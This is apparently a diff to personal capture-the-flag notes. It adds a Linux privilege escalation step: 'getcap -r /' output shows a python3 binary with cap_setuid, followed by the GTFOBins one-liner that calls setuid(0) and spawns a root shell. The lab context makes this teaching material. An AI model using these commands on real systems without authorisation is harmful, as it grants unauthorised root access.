@@ -8,3 +8,20 @@ https://github.com/internetwache/GitTools.git/
 940d71e8655ac41efb5f8ab850668505b86dd64186a66e57d1483e7f5fe6fd81 (Gost hash)
 
 synt{a0jvgf33zfa0ez4y} (It looks like flag but it uses ROT 13
+
+Privilege escalation using capabilities
+----------------------------------------
+Capabilities is a concept that provides a security system that allows "divide" root privileges into different values 
+#getcap -r / 
+
+/home/kiba/.hackmeplease/python3 = cap_setuid+ep
+/usr/bin/mtr = cap_net_raw+ep
+/usr/bin/traceroute6.iputils = cap_net_raw+ep
+/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
+
+python3 has capability so use the script from gtfobin (python3 capabilities)
+#cd /home/kiba/.hackmeplease
+python3
+
+
+#./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
